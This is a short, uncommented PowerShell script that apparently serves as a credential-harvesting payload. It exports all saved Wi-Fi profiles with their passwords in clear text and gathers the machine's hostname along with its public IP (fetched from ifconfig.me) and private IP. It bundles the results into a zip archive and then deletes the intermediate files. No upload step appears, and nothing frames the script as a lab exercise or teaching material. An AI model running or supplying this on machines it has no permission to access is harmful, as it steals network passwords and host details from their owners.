netsh wlan export profile key=clear

$Public = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
$Private = (Get-NetIPAddress | Where-Object {$_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00"}).IPAddress
$HostName = [System.Net.Dns]::GetHostByAddress($Private).Hostname

"Host Name,Public IP,Private IP`n$HostName,$Public,$Private" | Out-File -FilePath .\IP_Addresses.csv

Compress-Archive -U -Path .\Wi-Fi*.xml, IP_Addresses.csv -DestinationPath SSID_IP.zip
rm .\Wi-Fi*.xml, IP_Addresses.csv